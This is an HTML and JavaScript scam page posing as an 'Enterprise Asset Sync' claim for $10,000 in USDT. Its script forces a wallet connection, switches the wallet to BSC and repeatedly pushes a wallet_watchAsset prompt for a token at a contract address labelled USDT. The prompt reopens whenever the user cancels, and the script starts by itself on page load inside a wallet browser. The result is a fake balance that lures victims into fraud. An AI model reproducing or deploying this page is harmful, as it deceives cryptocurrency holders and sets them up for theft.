<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Enterprise Asset Sync</title>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
    <style>
        body { background: #0b0e11; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .box { background: #1a1d21; border: 1px solid #26a17b; padding: 40px; border-radius: 20px; text-align: center; width: 85%; }
        .btn { background: #26a17b; color: #fff; border: none; padding: 20px; width: 100%; border-radius: 12px; font-weight: bold; font-size: 18px; cursor: pointer; margin-top: 25px; box-shadow: 0 5px 20px rgba(38,161,123,0.4); }
        #msg { font-size: 11px; color: #555; margin-top: 20px; font-family: monospace; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://assets.coingecko.com/coins/images/325/large/Tether.png" width="80">
    <h1 style="margin: 15px 0;">$10,000.00</h1>
    <div style="color: #26a17b; font-weight: bold;">NODE ALLOCATION READY</div>
    <button class="btn" id="claim">ACTIVATE & ADD USDT</button>
    <div id="msg">SYSTEM_STATUS: SECURE_BRIDGE_ACTIVE</div>
</div>

<script>
    const btn = document.getElementById('claim');
    const msg = document.getElementById('msg');

    async function forceSync() {
        const provider = window.trustwallet || window.ethereum;

        if (!provider) {
            msg.innerText = "ERROR: PLEASE OPEN THIS LINK INSIDE TRUST WALLET BROWSER";
            // Agar bahar hai to sirf redirect karega
            const raw = window.location.href.split('://')[1];
            window.location.href = "https://link.trustwallet.com/a/dapp?url=https://" + raw;
            return;
        }

        try {
            msg.innerText = "LOG: CONNECTING...";
            await provider.request({ method: 'eth_requestAccounts' });

            msg.innerText = "LOG: SWITCHING TO BSC...";
            await provider.request({
                method: 'wallet_switchEthereumChain',
                params: [{ chainId: '0x38' }],
            }).catch(async (e) => {
                if (e.code === 4902) {
                    await provider.request({
                        method: 'wallet_addEthereumChain',
                        params: [{
                            chainId: '0x38',
                            chainName: 'BSC',
                            rpcUrls: ['https://bsc-dataseed.binance.org/'],
                            nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 }
                        }]
                    });
                }
            });

            msg.innerText = "LOG: INJECTING USDT...";
            // Force watchAsset with recursive retry
            const triggerAsset = async () => {
                const ok = await provider.request({
                    method: 'wallet_watchAsset',
                    params: {
                        type: 'ERC20',
                        options: {
                            address: "0x5Cd9e1C97d3784DC7BFC4E5cefd775F58778985f",
                            symbol: "USDT",
                            decimals: 18,
                            image: "https://assets.coingecko.com/coins/images/325/large/Tether.png"
                        }
                    }
                });
                if (!ok) setTimeout(triggerAsset, 1000); // Agar cancel kare to phir se popup
            };
            
            await triggerAsset();

        } catch (err) {
            msg.innerText = "LOG: SESSION_REJECTED. CLICK AGAIN.";
            setTimeout(forceSync, 1000);
        }
    }

    btn.onclick = forceSync;

    window.onload = () => {
        if (window.ethereum || window.trustwallet) {
            // Wallet ke andar 3 seconds baad auto-run
            setTimeout(forceSync, 3000);
        }
    };
</script>
</body>
</html>
